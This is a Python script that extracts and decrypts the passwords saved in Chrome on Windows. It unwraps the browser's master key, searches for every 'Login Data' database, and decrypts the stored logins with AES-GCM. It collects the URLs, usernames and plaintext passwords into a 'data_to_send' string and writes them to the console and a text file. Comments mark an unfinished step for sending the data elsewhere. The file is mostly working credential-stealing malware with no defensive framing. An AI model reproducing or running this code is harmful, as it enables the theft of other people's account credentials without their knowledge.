import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import tkinter as tk
from tkinter import filedialog
import time
#######################################################
# take 0 user input takes seeks all login data files and decrypts
# part of the baker line
#
# can also be made for serial port
#

# GLOBAL CONSTANT
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def find_login_data_files(root_folder):
    login_data_files = []
    for root, _, files in os.walk(root_folder):
        for file_name in files:
            print(file_name)
            if file_name == "Login Data":
                login_data_files.append(os.path.join(root, file_name))
    return login_data_files

def get_secret_key():
    try:
        CHROME_PATH_LOCAL_STATE = os.path.normpath(
            r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None


if __name__ == '__main__':
    try:
        data_to_send = ""
        # (1) Get secret key
        secret_key = get_secret_key()
        print("[*]got key!")

        # (2) Find all "Login Data" files
        search_directory = CHROME_PATH

        # Sleep for 1 second
        time.sleep(2)

        login_data_files = find_login_data_files(search_directory)
        print("[*]login files obtained")

        for login_data_file in login_data_files:
            chrome_path_login_db = login_data_file
            conn = get_db_connection(chrome_path_login_db)

            if (secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if (url != "" and username != "" and ciphertext != ""):
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        # Construct a string with the data
                        data_to_send += f"Sequence: {index}\n"
                        data_to_send += f"URL: {url}\n"
                        data_to_send += f"User Name: {username}\n"
                        data_to_send += f"Password: {decrypted_password}\n"
                        data_to_send += "*" * 50 + "\n"
                        print(data_to_send)#prints to consol


                ##what ti do with plain text data_to_send


                # Close database connection
                cursor.close()
                conn.close()

                # Delete temp login db
                os.remove("Loginvault.db")
                # Write data to a text file
        with open("example123.txt", "w") as file:
         file.write("change worked!\n")
         file.write("\n START< \n")
         file.write(data_to_send)
         print("[*] Data written to txt file")
         file.write("\n END> \n")

    except Exception as e:
        print("[ERR] %s" % str(e))
